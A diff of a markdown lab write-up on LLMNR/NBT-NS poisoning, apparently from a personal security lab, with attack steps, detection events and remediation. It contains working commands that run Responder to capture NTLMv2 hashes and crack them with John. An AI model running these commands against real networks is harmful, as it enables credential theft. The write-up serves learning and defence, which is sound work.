@@ -1,14 +1,65 @@
-## Evidence Captured
+# Phase 1 — LLMNR/NBT-NS Poisoning
 
-### Wazuh Alert
-- Rule ID: 100001 — triggered on DC01
-- Event ID: 4648 — Explicit credential use detected
-- Subject: Administrator attempting to connect to unknown host
-- Significance: DC01 detected suspicious use of Domain Admin credentials
-  captured via LLMNR poisoning — confirms domain-level credential exposure
+## Overview
+LLMNR (Link-Local Multicast Name Resolution) is enabled by default on Windows.
+When a DNS lookup fails, Windows broadcasts an LLMNR query to the entire subnet.
+An attacker listening on the same network can respond to this broadcast,
+tricking the victim into sending NTLMv2 credentials.
 
-### Hash Capture
-- Tool: Responder
-- Hash Type: NTLMv2
-- Target User: testuser / Administrator
-- Result: Hash cracked via John → Password123
+## MITRE ATT&CK
+| Field | Value |
+|---|---|
+| Tactic | Credential Access |
+| Technique | T1557.001 — LLMNR/NBT-NS Poisoning |
+
+## Environment
+| Component | Details |
+|---|---|
+| Attacker | Kali Linux (10.0.0.99) |
+| Victim | WORKSTATION01 — Windows 10 Pro (10.0.0.30) |
+| Tool | Responder |
+
+## Attack Steps
+
+### 1. Start Responder on Kali
+```bash
+sudo responder -I eth0 -dw
+```
+
+### 2. Trigger LLMNR broadcast from WORKSTATION01
+Open File Explorer and navigate to a non-existent share:
+```
+\\nonexistent-server
+```
+Windows fails DNS → broadcasts LLMNR → Responder intercepts
+
+### 3. Capture NTLMv2 Hash
+Responder captures the hash automatically:
+```
+[SMB] NTLMv2 Hash captured from 10.0.0.30
+```
+
+### 4. Crack the Hash
+```bash
+john /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.0.30.txt \
+  --wordlist=/usr/share/wordlists/rockyou.txt
+```
+**Result:** testuser:Password123
+
+## Evidence
+| File | Description |
+|---|---|
+| `Evidence/Screenshots/Phase1-llmnr-hash-captured.png` | NTLMv2 hash captured by Responder |
+| `Evidence/Screenshots/phase1-wazuh-alert-100001.png` | Wazuh rule 100001 triggered |
+
+## Detection
+| Source | Event ID | Indicator |
+|---|---|---|
+| Windows Security Log | 4648 | Explicit credential use to unknown host |
+| Wazuh Rule 100001 | level 10 | LLMNR poisoning — T1557.001 |
+
+## Remediation
+- Disable LLMNR via GPO:
+  `Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled`
+- Disable NBT-NS on all network adapters
+- Enable SMB signing to prevent relay attacks
